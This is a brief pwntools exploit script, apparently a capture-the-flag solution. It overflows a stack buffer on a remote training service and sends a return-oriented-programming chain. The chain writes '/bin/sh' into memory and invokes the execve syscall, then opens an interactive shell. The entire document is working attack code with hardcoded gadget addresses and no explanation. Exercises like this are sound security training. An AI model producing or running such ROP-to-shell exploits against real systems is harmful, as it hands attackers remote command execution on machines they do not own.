#!/usr/bin/python3
from pwn import *

context.arch = 'amd64'

r = remote('edu-ctf.zoolab.org', 10003)

data_sec = 0x4c50e0
mov_rax_rdi = 0x48d6a4 # mov qword ptr [rax], rdi ; pop rbx ; ret
ret = 0x43cd10 # xor rax, rax ; ret
pop_rdi_ret = 0x401e3f # pop rdi ; ret
pop_rsi_ret = 0x409e6e # pop rsi ; ret
pop_rdx_ret = 0x47ed0b # pop rdx ; pop rbx ; ret
pop_rax_ret = 0x447b27 # pop rax ; ret
syscall_ret = 0x414506 # syscall ; ret

ROP = flat(
    pop_rax_ret, data_sec,
    pop_rdi_ret, "/bin/sh\x00",
    mov_rax_rdi, 0,
    pop_rdi_ret, data_sec,
    pop_rsi_ret, 0,
    pop_rdx_ret, 0, 0,
    pop_rax_ret, 0x3b,
    syscall_ret
)


r.sendafter('show me rop\n> ', b'A'*0x28 + p64(ret) + ROP)
r.interactive()